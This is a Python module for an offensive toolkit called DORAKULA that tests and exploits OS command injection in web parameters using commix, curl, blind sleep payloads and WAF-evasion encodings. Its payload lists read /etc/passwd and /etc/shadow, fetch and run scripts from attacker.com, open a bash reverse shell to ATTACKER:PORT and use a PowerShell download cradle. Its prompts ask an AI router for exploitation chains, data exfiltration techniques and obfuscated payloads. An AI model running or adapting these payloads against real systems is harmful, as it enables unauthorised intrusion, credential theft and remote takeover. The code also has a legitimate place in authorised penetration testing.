#!/usr/bin/env python3
"""DORAKULA Command Injection Tester - OS Command Injection Detection & Exploitation

Comprehensive command injection testing module using commix, time-based blind
testing, AI-enhanced payload generation, and WAF bypass techniques.
"""

import asyncio
import subprocess
import json
import logging
import re
import time
from typing import Dict, List, Any, Optional
from urllib.parse import urlparse, urlencode, quote

logger = logging.getLogger(__name__)


class CommandInjector:
    """Advanced OS command injection tester with commix integration.

    Combines automated commix scanning with custom blind injection testing,
    AI-generated payloads, and comprehensive WAF bypass techniques.

    Attributes:
        ai_router: AI router instance for intelligent payload generation.
        timeout: Default timeout for subprocess calls in seconds.
    """

    # Command injection payloads
    INJECTION_PAYLOADS: List[Dict[str, Any]] = [
        # Basic separators
        {"payload": ";id", "separator": ";", "command": "id", "type": "basic"},
        {"payload": "|id", "separator": "|", "command": "id", "type": "basic"},
        {"payload": "&&id", "separator": "&&", "command": "id", "type": "basic"},
        {"payload": "||id", "separator": "||", "command": "id", "type": "basic"},
        {"payload": "\nid", "separator": "\n", "command": "id", "type": "basic"},
        # Subshell
        {"payload": "$(id)", "separator": "$()", "command": "id", "type": "subshell"},
        {"payload": "`id`", "separator": "``", "command": "id", "type": "subshell"},
        # With prefix
        {"payload": "id;#", "separator": ";#", "command": "id", "type": "comment"},
        {"payload": "id;//", "separator": ";//", "command": "id", "type": "comment"},
        # Blind time-based
        {"payload": ";sleep 5;", "separator": ";", "command": "sleep", "type": "blind_time", "delay": 5},
        {"payload": "|sleep 5|", "separator": "|", "command": "sleep", "type": "blind_time", "delay": 5},
        {"payload": "&&sleep 5&&", "separator": "&&", "command": "sleep", "type": "blind_time", "delay": 5},
        {"payload": "$(sleep 5)", "separator": "$()", "command": "sleep", "type": "blind_time", "delay": 5},
        {"payload": "`sleep 5`", "separator": "``", "command": "sleep", "type": "blind_time", "delay": 5},
        # Windows variants
        {"payload": "&timeout 5", "separator": "&", "command": "timeout", "type": "blind_time_win", "delay": 5},
        {"payload": "|ping -n 5 127.0.0.1", "separator": "|", "command": "ping", "type": "blind_time_win", "delay": 5},
    ]

    # WAF bypass payloads
    WAF_BYPASS_PAYLOADS: List[Dict[str, str]] = [
        # Case manipulation
        {"payload": ";Id", "category": "case_manipulation", "description": "Mixed case"},
        {"payload": ";iD", "category": "case_manipulation", "description": "Alternative mixed case"},
        {"payload": ";i\\d", "category": "escape_char", "description": "Backslash escape"},
        # Whitespace bypass
        {"payload": ";id${IFS}", "category": "ifs_bypass", "description": "IFS variable"},
        {"payload": ";id$IFS", "category": "ifs_bypass", "description": "IFS without braces"},
        {"payload": ";id%09", "category": "tab_bypass", "description": "Tab character"},
        {"payload": ";id%0a", "category": "newline_bypass", "description": "Newline character"},
        {"payload": ";id%0d", "category": "cr_bypass", "description": "Carriage return"},
        # Variable substitution
        {"payload": ";c\\at${IFS}/etc/passwd", "category": "variable_sub", "description": "IFS with cat"},
        {"payload": ";/bin/c\\at${IFS}/etc/passwd", "category": "variable_sub", "description": "Full path with IFS"},
        # Brace expansion
        {"payload": ";{id}", "category": "brace_expansion", "description": "Bash brace expansion"},
        # Concatenation
        {"payload": ";i''d", "category": "string_concat", "description": "Empty string concat"},
        {"payload": ";i""d", "category": "string_concat", "description": "Double quote concat"},
        {"payload": ";i\\d", "category": "escape_bypass", "description": "Backslash escape"},
        # Hex encoding
        {"payload": ";$(printf '\\x69\\x64')", "category": "hex_encode", "description": "Hex-encoded command"},
        {"payload": ";$(printf '\\151\\144')", "category": "octal_encode", "description": "Octal-encoded command"},
        # Base64
        {"payload": ";echo aWQ=|base64 -d|bash", "category": "base64_encode", "description": "Base64-encoded command"},
        # Path expansion
        {"payload": ";/???/??", "category": "glob_expansion", "description": "Glob wildcard"},
        {"payload": ";/???/??t${IFS}/???/??????", "category": "glob_expansion", "description": "Full glob cat passwd"},
        # Tilde expansion
        {"payload": ";cat+/etc/passwd", "category": "plus_bypass", "description": "Plus as separator"},
        # Double URL encoding
        {"payload": "%3Bid", "category": "url_encode", "description": "URL-encoded semicolon"},
        {"payload": "%253Bid", "category": "double_encode", "description": "Double URL-encoded"},
    ]

    def __init__(self, ai_router: Any = None, timeout: int = 300):
        """Initialize CommandInjector.

        Args:
            ai_router: AIRouter instance for AI-enhanced operations.
            timeout: Default command timeout in seconds.
        """
        self.ai_router = ai_router
        self.timeout = timeout
        self._commix_path: Optional[str] = None
        logger.info("CommandInjector initialized with timeout=%d", timeout)

    def _find_commix(self) -> Optional[str]:
        """Locate commix binary on the system.

        Returns:
            Full path to commix or None if not found.
        """
        try:
            result = subprocess.run(
                ["which", "commix"],
                capture_output=True, text=True, timeout=10
            )
            if result.returncode == 0:
                return result.stdout.strip()
            # Try common locations
            for path in ["/usr/share/commix/commix.py", "/opt/commix/commix.py"]:
                try:
                    import os
                    if os.path.isfile(path):
                        return path
                except OSError:
                    continue
        except (subprocess.TimeoutExpired, OSError) as exc:
            logger.warning("Failed to locate commix: %s", exc)
        return None

    @property
    def commix_path(self) -> Optional[str]:
        """Lazy-locate commix binary."""
        if self._commix_path is None:
            self._commix_path = self._find_commix()
        return self._commix_path

    async def test_injection(self, target: str, parameter: str) -> Dict[str, Any]:
        """Run commix and manual command injection tests against the target.

        Executes commix automated scanner followed by manual payload testing
        for command injection vulnerabilities.

        Args:
            target: Target URL with injectable parameter.
            parameter: Parameter name to test for command injection.

        Returns:
            Dictionary containing:
                - commix_results: commix scan output
                - manual_results: Manual injection test results
                - confirmed: Confirmed command injection findings
                - errors: List of any errors encountered
        """
        results: Dict[str, Any] = {
            "target": target,
            "parameter": parameter,
            "commix_results": {},
            "manual_results": [],
            "confirmed": [],
            "errors": [],
        }

        # Run commix if available
        if self.commix_path:
            try:
                cmd = [
                    "python3", self.commix_path,
                    "--url", f"{target}",
                    "--data", f"{parameter}=INJECT_HERE",
                    "--batch",
                    "--timeout", str(self.timeout),
                ]
                proc = await asyncio.create_subprocess_exec(
                    *cmd,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE,
                )
                stdout, stderr = await asyncio.wait_for(
                    proc.communicate(), timeout=self.timeout + 30
                )
                commix_output = stdout.decode("utf-8", errors="replace")
                commix_errors = stderr.decode("utf-8", errors="replace")

                commix_findings = []
                for line in commix_output.splitlines():
                    low = line.lower()
                    if "vulnerable" in low or "injection" in low:
                        commix_findings.append(line.strip()[:500])
                    elif "identified" in low and "injection" in low:
                        commix_findings.append(line.strip()[:500])

                results["commix_results"] = {
                    "findings": commix_findings,
                    "output": commix_output[:3000],
                    "stderr": commix_errors[:2000],
                    "return_code": proc.returncode,
                }

                for finding in commix_findings:
                    results["confirmed"].append({
                        "source": "commix",
                        "detail": finding,
                    })

                logger.info("commix scan completed: %d findings", len(commix_findings))

            except asyncio.TimeoutError:
                results["errors"].append("commix scan timed out")
                logger.warning("commix scan timed out for %s", target)
            except OSError as exc:
                results["errors"].append(f"commix execution error: {exc}")
                logger.error("commix execution error: %s", exc)
        else:
            results["errors"].append("commix not found on system")
            logger.info("commix not available, proceeding with manual testing")

        # Manual injection testing
        parsed = urlparse(target)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

        for inj in self.INJECTION_PAYLOADS:
            if inj["type"] == "blind_time":
                continue  # Handled in test_blind_injection

            try:
                inject_url = f"{base_url}?{parameter}={quote(inj['payload'], safe='')}"
                cmd = [
                    "curl", "-s",
                    "--max-time", str(self.timeout),
                    inject_url,
                ]
                proc = await asyncio.create_subprocess_exec(
                    *cmd,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE,
                )
                stdout, _ = await asyncio.wait_for(
                    proc.communicate(), timeout=self.timeout + 5
                )
                response = stdout.decode("utf-8", errors="replace")

                entry: Dict[str, Any] = {
                    "payload": inj["payload"],
                    "separator": inj["separator"],
                    "command": inj["command"],
                    "type": inj["type"],
                    "response_length": len(response),
                    "status": "no_indicators",
                }

                # Check for command output indicators
                cmdi_indicators = [
                    (r"uid=\d+\([^)]+\)", "unix_id"),
                    (r"gid=\d+\([^)]+\)", "unix_gid"),
                    (r"groups=\d+", "unix_groups"),
                    (r"root:x:0:0:", "etc_passwd"),
                    (r"Microsoft Windows", "windows_os"),
                    (r"total \d+\n", "ls_output"),
                    (r"Directory of", "dir_output"),
                ]

                for pattern, indicator_type in cmdi_indicators:
                    match = re.search(pattern, response)
                    if match:
                        entry["status"] = "confirmed_injection"
                        entry["indicator"] = indicator_type
                        entry["matched_output"] = match.group()[:200]
                        results["confirmed"].append({
                            "source": "manual",
                            "payload": inj["payload"],
                            "separator": inj["separator"],
                            "indicator": indicator_type,
                            "output": match.group()[:500],
                        })
                        break

                results["manual_results"].append(entry)

            except asyncio.TimeoutError:
                results["errors"].append(
                    f"Timeout testing payload: {inj['payload'][:50]}"
                )
            except OSError as exc:
                results["errors"].append(f"Request error: {exc}")

        # AI analysis
        if self.ai_router and results["confirmed"]:
            try:
                ai_result = await self.ai_router.query(
                    f"Command injection vulnerabilities found. Analyze impact "
                    f"and suggest exploitation chains:\n"
                    f"{json.dumps(results['confirmed'][:5], indent=2)}",
                    context="cmdi_analysis"
                )
                results["ai_analysis"] = ai_result
            except (AttributeError, OSError, RuntimeError) as exc:
                logger.warning("AI command injection analysis failed: %s", exc)

        logger.info("Command injection test complete: %d confirmed",
                     len(results["confirmed"]))
        return results

    async def test_blind_injection(self, target: str, parameter: str) -> Dict[str, Any]:
        """Test time-based blind command injection.

        Injects sleep/timeout payloads and measures response time to detect
        blind command injection vulnerabilities.

        Args:
            target: Target URL with injectable parameter.
            parameter: Parameter name to test for blind injection.

        Returns:
            Dictionary containing:
                - findings: Confirmed blind injection findings
                - baseline_time: Baseline response time in seconds
                - tested_payloads: Number of payloads tested
                - errors: List of any errors encountered
        """
        results: Dict[str, Any] = {
            "target": target,
            "parameter": parameter,
            "findings": [],
            "baseline_time": 0.0,
            "tested_payloads": 0,
            "errors": [],
        }

        parsed = urlparse(target)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

        # Step 1: Establish baseline response time
        baseline_times: List[float] = []
        for _ in range(3):
            try:
                inject_url = f"{base_url}?{parameter}=normal_value"
                cmd = ["curl", "-s", "-o", "/dev/null",
                       "-w", "%{time_total}",
                       "--max-time", "15", inject_url]
                proc = await asyncio.create_subprocess_exec(
                    *cmd,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE,
                )
                stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=20)
                elapsed = float(stdout.decode("utf-8", errors="replace").strip())
                baseline_times.append(elapsed)
            except (asyncio.TimeoutError, ValueError, OSError):
                baseline_times.append(5.0)

        results["baseline_time"] = round(sum(baseline_times) / len(baseline_times), 3) if baseline_times else 0.0
        baseline = results["baseline_time"]

        # Step 2: Test time-based payloads with different delays
        sleep_delays: List[int] = [5, 7]
        blind_payloads: List[Dict[str, Any]] = [
            # Unix sleep
            {"payload": f";sleep {sleep_delays[0]};", "type": "unix_sleep", "expected_delay": sleep_delays[0]},
            {"payload": f"|sleep {sleep_delays[0]}|", "type": "unix_sleep_pipe", "expected_delay": sleep_delays[0]},
            {"payload": f"&&sleep {sleep_delays[0]}&&", "type": "unix_sleep_and", "expected_delay": sleep_delays[0]},
            {"payload": f"$(sleep {sleep_delays[0]})", "type": "unix_sleep_subshell", "expected_delay": sleep_delays[0]},
            {"payload": f"`sleep {sleep_delays[0]}`", "type": "unix_sleep_backtick", "expected_delay": sleep_delays[0]},
            {"payload": f"&sleep {sleep_delays[0]}&", "type": "unix_sleep_bg", "expected_delay": sleep_delays[0]},
            # Sleep with newline
            {"payload": f"\nsleep {sleep_delays[0]}", "type": "unix_sleep_newline", "expected_delay": sleep_delays[0]},
            # Confirmation with different delay
            {"payload": f";sleep {sleep_delays[1]};", "type": "unix_sleep_confirm", "expected_delay": sleep_delays[1]},
            # Windows
            {"payload": f"&timeout {sleep_delays[0]}", "type": "win_timeout", "expected_delay": sleep_delays[0]},
            {"payload": f"|ping -n {sleep_delays[0]} 127.0.0.1|", "type": "win_ping", "expected_delay": sleep_delays[0]},
            # IFS bypass
            {"payload": f";sleep${sleep_delays[0]};", "type": "unix_sleep_ifs", "expected_delay": sleep_delays[0]},
        ]

        for bp in blind_payloads:
            results["tested_payloads"] += 1
            try:
                inject_url = f"{base_url}?{parameter}={quote(str(bp['payload']), safe='')}"
                start_time = time.monotonic()
                cmd = ["curl", "-s", "-o", "/dev/null",
                       "-w", "%{time_total}",
                       "--max-time", str(bp["expected_delay"] + 10),
                       inject_url]
                proc = await asyncio.create_subprocess_exec(
                    *cmd,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE,
                )
                stdout, _ = await asyncio.wait_for(
                    proc.communicate(), timeout=bp["expected_delay"] + 15
                )
                elapsed = time.monotonic() - start_time

                # Also get curl's time
                try:
                    curl_time = float(stdout.decode("utf-8", errors="replace").strip())
                    elapsed = curl_time
                except ValueError:
                    pass

                delay_detected = elapsed - baseline
                threshold = bp["expected_delay"] * 0.6  # 60% of expected delay

                if delay_detected >= threshold:
                    results["findings"].append({
                        "payload": bp["payload"],
                        "type": bp["type"],
                        "expected_delay": bp["expected_delay"],
                        "actual_delay": round(delay_detected, 3),
                        "baseline": baseline,
                        "elapsed": round(elapsed, 3),
                        "status": "confirmed_blind_injection",
                    })

            except asyncio.TimeoutError:
                # Timeout can actually indicate successful injection
                elapsed = time.monotonic() - start_time
                if elapsed >= bp["expected_delay"]:
                    results["findings"].append({
                        "payload": bp["payload"],
                        "type": bp["type"],
                        "expected_delay": bp["expected_delay"],
                        "actual_delay": round(elapsed, 3),
                        "status": "timeout_possible_injection",
                    })
            except (OSError, ValueError) as exc:
                results["errors"].append(f"Blind test error: {exc}")

        # Deduplicate findings - only report if confirmed by different delay
        confirmed_types: Dict[str, int] = {}
        for finding in results["findings"]:
            ftype = finding["type"].replace("_confirm", "").replace("5", "").replace("7", "")
            confirmed_types[ftype] = confirmed_types.get(ftype, 0) + 1

        # AI analysis
        if self.ai_router and results["findings"]:
            try:
                ai_result = await self.ai_router.query(
                    f"Blind command injection findings. Analyze and suggest "
                    f"data exfiltration techniques:\n"
                    f"{json.dumps(results['findings'][:5], indent=2)}",
                    context="blind_cmdi_analysis"
                )
                results["ai_analysis"] = ai_result
            except (AttributeError, OSError, RuntimeError) as exc:
                logger.warning("AI blind injection analysis failed: %s", exc)

        logger.info("Blind injection test complete: %d findings",
                     len(results["findings"]))
        return results

    async def generate_payloads(self, target: str, os_type: str) -> Dict[str, Any]:
        """Generate AI-enhanced command injection payloads for the target OS.

        Creates OS-specific payloads with WAF bypass techniques and
        AI-generated variations.

        Args:
            target: Target URL for context-aware generation.
            os_type: Target OS type ('linux', 'windows', 'unknown').

        Returns:
            Dictionary containing:
                - payloads: List of generated payloads with metadata
                - os_type: Target OS type used
                - ai_payloads: AI-generated payloads
        """
        payloads: List[Dict[str, str]] = []

        if os_type in ("linux", "unknown"):
            linux_payloads: List[Dict[str, str]] = [
                {"payload": ";id", "category": "basic", "description": "ID command"},
                {"payload": ";whoami", "category": "basic", "description": "Whoami"},
                {"payload": ";uname -a", "category": "recon", "description": "System info"},
                {"payload": ";cat /etc/passwd", "category": "file_read", "description": "Read passwd"},
                {"payload": ";cat /etc/shadow", "category": "file_read", "description": "Read shadow"},
                {"payload": ";ls -la /", "category": "recon", "description": "List root directory"},
                {"payload": ";ifconfig", "category": "recon", "description": "Network info"},
                {"payload": ";netstat -tlnp", "category": "recon", "description": "Listening ports"},
                {"payload": ";ps aux", "category": "recon", "description": "Running processes"},
                {"payload": ";env", "category": "recon", "description": "Environment variables"},
                {"payload": ";cat /proc/self/environ", "category": "file_read", "description": "Process env"},
                {"payload": ";find / -perm -4000 2>/dev/null", "category": "privilege", "description": "SUID binaries"},
                {"payload": ";curl http://attacker.com/shell.sh|bash", "category": "rce", "description": "Reverse shell download"},
                {"payload": ";bash -i >& /dev/tcp/ATTACKER/PORT 0>&1", "category": "rce", "description": "Bash reverse shell"},
            ]
            payloads.extend(linux_payloads)

        if os_type in ("windows", "unknown"):
            windows_payloads: List[Dict[str, str]] = [
                {"payload": "&whoami", "category": "basic", "description": "Windows whoami"},
                {"payload": "&systeminfo", "category": "recon", "description": "System info"},
                {"payload": "&net user", "category": "recon", "description": "User listing"},
                {"payload": "&dir C:\\", "category": "recon", "description": "List C drive"},
                {"payload": "&type C:\\Windows\\win.ini", "category": "file_read", "description": "Read win.ini"},
                {"payload": "&ipconfig /all", "category": "recon", "description": "Network info"},
                {"payload": "&netstat -ano", "category": "recon", "description": "Connection list"},
                {"payload": "&tasklist", "category": "recon", "description": "Process list"},
                {"payload": "&powershell -c whoami", "category": "powershell", "description": "PowerShell whoami"},
                {"payload": "&powershell -c IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/shell.ps1')", "category": "rce", "description": "PowerShell download cradle"},
            ]
            payloads.extend(windows_payloads)

        # Add WAF bypass variants
        for p in payloads[:5]:
            original = p["payload"]
            # IFS bypass
            ifs_payload = original.replace(" ", "${IFS}")
            payloads.append({"payload": ifs_payload, "category": "ifs_bypass", "description": f"IFS: {p['description']}"})
            # Tab bypass
            tab_payload = original.replace(" ", "%09")
            payloads.append({"payload": tab_payload, "category": "tab_bypass", "description": f"Tab: {p['description']}"})

        # AI enhancement
        ai_payloads: List[Dict[str, str]] = []
        if self.ai_router:
            try:
                ai_result = await self.ai_router.query(
                    f"Generate 15 advanced command injection payloads for target {target} "
                    f"running {os_type}. Include: modern WAF bypasses, obfuscated commands, "
                    f"polyglot payloads, and chaining techniques. "
                    f"Format: one payload per line with brief description.",
                    context="cmdi_payload_generation"
                )
                if ai_result:
                    for line in ai_result.splitlines():
                        line = line.strip()
                        if line and not line.startswith("#") and len(line) < 500:
                            ai_payloads.append({
                                "payload": line,
                                "category": "ai_generated",
                                "description": "AI-generated command injection",
                            })
            except (AttributeError, OSError, RuntimeError) as exc:
                logger.warning("AI payload generation failed: %s", exc)

        result: Dict[str, Any] = {
            "target": target,
            "os_type": os_type,
            "payloads": payloads,
            "ai_payloads": ai_payloads,
            "total_count": len(payloads) + len(ai_payloads),
        }

        logger.info("Generated %d command injection payloads for %s",
                     result["total_count"], os_type)
        return result

    async def test_filter_bypass(self, target: str) -> Dict[str, Any]:
        """Test WAF bypass techniques for command injection.

        Systematically tests WAF bypass payloads including encoding,
        obfuscation, and protocol-level techniques.

        Args:
            target: Target URL with potential command injection.

        Returns:
            Dictionary containing:
                - bypass_results: Test results per bypass category
                - successful_bypasses: Bypass techniques that worked
                - waf_detected: Whether a WAF was detected
                - errors: List of any errors encountered
        """
        results: Dict[str, Any] = {
            "target": target,
            "bypass_results": [],
            "successful_bypasses": [],
            "waf_detected": False,
            "errors": [],
        }

        parsed = urlparse(target)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

        # First, check for WAF presence
        waf_indicators: List[str] = [
            "forbidden", "access denied", "waf", "firewall",
            "blocked", "security", "not allowed", "rejected",
            "403", "modsecurity", "cloudflare", "imperva",
        ]

        try:
            # Send a clearly malicious request
            test_url = f"{base_url}?cmd=;cat+/etc/passwd"
            cmd = ["curl", "-s", "-w", "\\n%{http_code}", "--max-time", "15", test_url]
            proc = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=20)
            response = stdout.decode("utf-8", errors="replace")

            for indicator in waf_indicators:
                if indicator.lower() in response.lower():
                    results["waf_detected"] = True
                    break

        except (asyncio.TimeoutError, OSError):
            pass

        # Test each bypass payload
        params_to_test: List[str] = ["cmd", "exec", "command", "q", "input"]
        if parsed.query:
            for param in parsed.query.split("&"):
                name = param.split("=")[0] if "=" in param else param
                params_to_test.insert(0, name)

        for bypass in self.WAF_BYPASS_PAYLOADS:
            for param in params_to_test[:3]:
                try:
                    inject_url = f"{base_url}?{param}={quote(bypass['payload'], safe='')}"
                    cmd = ["curl", "-s", "--max-time", "15", inject_url]
                    proc = await asyncio.create_subprocess_exec(
                        *cmd,
                        stdout=asyncio.subprocess.PIPE,
                        stderr=asyncio.subprocess.PIPE,
                    )
                    stdout, _ = await asyncio.wait_for(
                        proc.communicate(), timeout=20
                    )
                    response = stdout.decode("utf-8", errors="replace")

                    entry: Dict[str, Any] = {
                        "payload": bypass["payload"],
                        "category": bypass["category"],
                        "description": bypass["description"],
                        "parameter": param,
                        "response_length": len(response),
                        "status": "no_indicators",
                    }

                    # Check for successful bypass
                    bypass_indicators = [
                        r"uid=\d+", "root:x:", "gid=", "groups=",
                        "total ", "drwx", "Microsoft Windows",
                    ]
                    for indicator in bypass_indicators:
                        if re.search(indicator, response) if r"\\" in indicator or r"\d" in indicator else indicator in response:
                            entry["status"] = "bypass_successful"
                            results["successful_bypasses"].append({
                                "payload": bypass["payload"],
                                "category": bypass["category"],
                                "parameter": param,
                            })
                            break

                    results["bypass_results"].append(entry)

                except asyncio.TimeoutError:
                    results["errors"].append(
                        f"Timeout testing {bypass['category']}: {bypass['payload'][:30]}"
                    )
                except OSError as exc:
                    results["errors"].append(f"Request error: {exc}")

        # AI analysis for additional bypasses
        if self.ai_router and results["waf_detected"]:
            try:
                ai_result = await self.ai_router.query(
                    f"WAF detected on {target}. Successful bypasses: "
                    f"{json.dumps(results['successful_bypasses'][:5], indent=2)}\n"
                    f"Suggest additional WAF bypass techniques based on these results.",
                    context="waf_bypass_analysis"
                )
                results["ai_bypass_suggestions"] = ai_result
            except (AttributeError, OSError, RuntimeError) as exc:
                logger.warning("AI WAF bypass analysis failed: %s", exc)

        logger.info("WAF bypass test complete: WAF=%s, %d successful bypasses",
                     results["waf_detected"], len(results["successful_bypasses"]))
        return results
